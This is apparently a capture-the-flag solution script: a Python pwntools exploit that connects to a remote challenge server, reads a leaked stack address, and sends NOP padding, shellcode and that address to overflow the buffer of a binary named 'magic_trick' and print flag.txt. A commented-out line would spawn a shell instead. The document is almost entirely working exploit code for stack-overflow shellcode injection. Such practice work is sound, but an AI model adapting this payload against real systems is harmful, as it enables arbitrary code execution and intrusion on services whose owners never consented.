#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./magic_trick', checksec = False)
# p = process(elf.path)
p = remote('94.237.56.76', 36029)
context.log_level = 'debug'

offset = 72  # found with pwndbg
p.recvuntil("The number is '")			# save the given address to jump to it
address = int(p.recvuntil("'")[:-1], 16) 	# to execute the shellcode	
info(p64(address))

shellcode = asm(shellcraft.popad())
# shellcode = asm(shellcraft.sh()) 		 # coudn't take a shell so i print the flag
shellcode += asm(shellcraft.cat('flag.txt'))
padding = asm('nop') * (offset - len(shellcode)) # substract to calculates the amount of padding needed 
						 # to fill the space between the end of the shellcode and the return address

payload = flat(
	padding,
	shellcode,
	address,
	)

p.recvuntil('>>')
p.sendline('y')
p.recvuntil('>>')
p.send(payload)
p.interactive()
